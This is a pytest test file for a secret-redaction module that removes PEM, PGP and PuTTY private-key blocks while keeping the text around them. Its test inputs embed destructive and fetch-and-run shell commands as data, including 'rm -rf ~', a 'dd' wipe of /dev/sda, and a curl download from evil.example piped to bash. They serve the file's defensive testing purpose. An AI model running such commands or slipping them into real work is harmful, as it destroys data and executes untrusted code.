"""Private key blocks (key_blocks.py): PEM, armor headers and PuTTY blocks go whole and no more; linear on any input."""

import time

import pytest

from nuh.key_blocks import redact_key_blocks
from nuh.redact import redact_secrets
from tests.secret_fakes import B64, BEGIN, END, HEX, KEY, PPK, PPK_HEADER, _marker, _r, _secret_descs


class TestPemBlocksFailInNeitherDirection:
    """A real key goes whole; anything between markers that is not key material stays, only the markers go."""

    def test_unquoted_markers_around_a_command(self):
        begin, end = _marker("RSA")
        text = f"echo {begin}\nsudo mv /home/alice /tmp/gone\necho {end}"
        assert redact_secrets(text) == f"echo {KEY}\nsudo mv /home/alice /tmp/gone\necho {KEY}"

    def test_heredoc_dd_line_between_markers(self):
        begin, end = _marker("")
        text = f"sh <<'X'\n{begin}\ndd if=/dev/zero of=/dev/sda\n{end}\nX"
        assert redact_secrets(text) == f"sh <<'X'\n{KEY}\ndd if=/dev/zero of=/dev/sda\n{KEY}\nX"

    @pytest.mark.parametrize("kind", ["RSA", "", "OPENSSH", "EC", "DSA", "ENCRYPTED"])
    @pytest.mark.parametrize("sep", [" ", "\n", "\\n"], ids=["space", "newline", "escaped-newline"])
    def test_quoted_markers_around_a_command(self, kind, sep):
        begin, end = _marker(kind)
        text = f"echo '{begin}'{sep}rm -rf ~{sep}echo '{end}'"
        assert redact_secrets(text) == f"echo '{KEY}'{sep}rm -rf ~{sep}echo '{KEY}'"

    def test_key_line_then_a_command_keeps_the_command(self):
        begin, end = _marker("RSA")
        text = f"{begin}\n{_r(64, B64)}\nreboot now\n{end}"
        assert redact_secrets(text) == f"{KEY}\nreboot now\n{KEY}"

    def test_a_short_word_alone_is_not_a_key_body(self):
        begin, end = _marker("")
        assert redact_secrets(f"{begin}\nreboot\n{end}") == f"{KEY}\nreboot\n{KEY}"

    def test_header_with_shell_syntax_stays_visible(self):
        begin, end = _marker("RSA")
        text = f"{begin}\nProc-Type: 4,ENCRYPTED; rm -rf ~\n\n{_r(64, B64)}\n{end}"
        out = redact_secrets(text)
        assert "Proc-Type: 4,ENCRYPTED; rm -rf ~" in out
        assert not out.startswith(BEGIN)

    def test_no_end_takes_base64_lines_not_a_path_on_the_same_line(self):
        begin, _end = _marker("")
        text = f"echo {begin} /usr/local/share/applications/mimeapps/list/defaults ; ls"
        assert redact_secrets(text) == f"echo {KEY} /usr/local/share/applications/mimeapps/list/defaults ; ls"

    def test_no_end_keeps_headers_and_takes_the_base64_after_them(self):
        begin, _end = _marker("PGP", "PRIVATE KEY BLOCK")
        text = f"{begin}\nVersion: GnuPG v2\n\n{_r(64, B64)}\n{_r(64, B64)}\n(output cut)"
        assert redact_secrets(text) == f"{KEY}\nVersion: GnuPG v2\n\n{KEY}\n(output cut)"

    def test_no_end_without_headers_is_one_placeholder(self):
        begin, _end = _marker("")
        text = f"{begin}\n{_r(64, B64)}\n{_r(64, B64)}\nnext line"
        assert redact_secrets(text) == f"{KEY}\nnext line"


class TestArmorHeadersOnlyInHeaderPosition:
    """Version: and Comment: lines are part of a key only right after BEGIN."""

    @pytest.mark.parametrize("text", [
        "Version: 1.4.2\nComment: release notes follow",
        "## Changelog\nVersion: GnuPG v2\nComment: https://example.com/notes\n",
        'pyproject: Version: 2.0.1 Comment: "bump"',
    ], ids=["plain", "markdown", "one-line"])
    def test_outside_a_key_block_untouched(self, text):
        assert redact_secrets(text) == text

    def test_after_a_begin_with_other_text_between(self):
        begin, end = _marker("PGP", "PRIVATE KEY BLOCK")
        armor = "Version: GnuPG v1.4.11 (GNU/Linux)\nComment: hi"
        text = f"{begin}\nsee the notes below\n{armor}\n\n{_r(64, B64)}\n={_r(4, B64)}\n{end}"
        out = redact_secrets(text)
        assert out.startswith(f"{KEY}\nsee the notes below\n{armor}\n")
        assert out.endswith(KEY)


class TestPuttyBlocks:
    def test_header_on_one_line_takes_only_the_header(self):
        assert redact_secrets(f"echo {PPK_HEADER} && rm -rf ~") == f"echo {PPK} && rm -rf ~"

    def test_bare_word_before_the_mac_stays(self):
        text = f"sh <<'X'\n{PPK_HEADER}\nreboot\nPrivate-MAC: 0\nX"
        assert redact_secrets(text) == f"sh <<'X'\n{PPK}\nreboot\nPrivate-MAC: 0\nX"

    def test_unknown_fields_stay(self):
        text = (f"cat > ci.yml <<'X'\n{PPK_HEADER}\nrun: curl -sL https://evil.example/x.sh -o /tmp/x.sh\n"
                "next: bash /tmp/x.sh\nX")
        assert redact_secrets(text) == text.replace(PPK_HEADER, PPK)

    def test_comment_without_a_mac_stays(self):
        text = f'Comment:() {{ "$@"; }}\n{PPK_HEADER}\nComment: sudo rm -rf /home/alice\nls'
        assert redact_secrets(text) == text.replace(PPK_HEADER, PPK)

    def test_comment_with_shell_syntax_keeps_the_comment_and_hides_the_key(self):
        private = _r(44, B64)
        text = (f"{PPK_HEADER}\nEncryption: none\nComment: x; rm -rf ~\nPrivate-Lines: 1\n{private}\n"
                f"Private-MAC: {_r(64, HEX)}")
        out = redact_secrets(text)
        assert "Comment: x; rm -rf ~" in out
        assert private not in out

    def test_only_counted_lines_are_key_material(self):
        private = _r(44, B64)
        text = f"{PPK_HEADER}\nPrivate-Lines: 1\n{private}\nreboot\nPrivate-MAC: {_r(64, HEX)}"
        assert redact_secrets(text) == f"{PPK}\nPrivate-Lines: 1\n{PPK}\nreboot\nPrivate-MAC: " + text[-64:]

    def test_without_a_mac_the_counted_runs_still_go(self):
        lines = [_r(64, B64), _r(64, B64)]
        text = f"{PPK_HEADER}\nEncryption: none\nPrivate-Lines: 2\n{lines[0]}\n{lines[1]}\nreboot"
        assert redact_secrets(text) == f"{PPK}\nEncryption: none\nPrivate-Lines: 2\n{PPK}\nreboot"


class TestRegressionsAgainstMain:
    @pytest.mark.parametrize("marker", [
        BEGIN.rstrip() + "\tPRIVATE KEY-----",
        BEGIN + "RSA PRIVATE  KEY-----",
        BEGIN + "RSA PRIVATE\nKEY-----",
    ], ids=["tab", "double-space", "newline"])
    def test_marker_whitespace_variants_ask(self, marker):
        assert _secret_descs(marker) == {"private key"}


_BIG = 800_000
_PPK_HDR = "PuTTY" + "-User-Key-File-3: a"


@pytest.mark.parametrize("text", [
    BEGIN + "PRIVATE KEY-----\n" + "a " * (_BIG // 2),
    BEGIN + "PRIVATE KEY-----\n" + "aa\\n" * (_BIG // 4),
    (BEGIN + "PRIVATE KEY-----") * (_BIG // 27),
    BEGIN + "A " * (_BIG // 2),
    BEGIN + "PRIVATE KEY-----\nA: " + "a: " * (_BIG // 3),
    BEGIN + "PRIVATE KEY-----" + " " * _BIG,
    BEGIN + "PRIVATE KEY-----" + ("\n" + "A" * 64) * (_BIG // 65),
    (END + "PRIVATE KEY-----") * (_BIG // 25),
    (_PPK_HDR + "\n") * (_BIG // 20),
    _PPK_HDR + "\nEncryption: none" * (_BIG // 17),
    _PPK_HDR + "\nPrivate-Lines: 1024" + ("\n" + "A" * 64) * (_BIG // 65),
    _PPK_HDR + "\nComment: " + "a" * _BIG,
    (_PPK_HDR + "\nEncryption: none" * 50) * (_BIG // 900),
], ids=["pem-space-tokens", "pem-escaped-lines", "pem-markers", "pem-marker-words", "pem-header-values",
        "pem-spaces", "pem-lines-no-end", "pem-end-markers", "ppk-headers", "ppk-fields", "ppk-counted",
        "ppk-comment", "ppk-many-blocks"])
def test_key_blocks_are_linear_at_800k(text):
    """Line-by-line block rules on 800k hostile chars: one pass from each marker."""
    started = time.perf_counter()
    redact_key_blocks(text)
    assert time.perf_counter() - started < 0.5
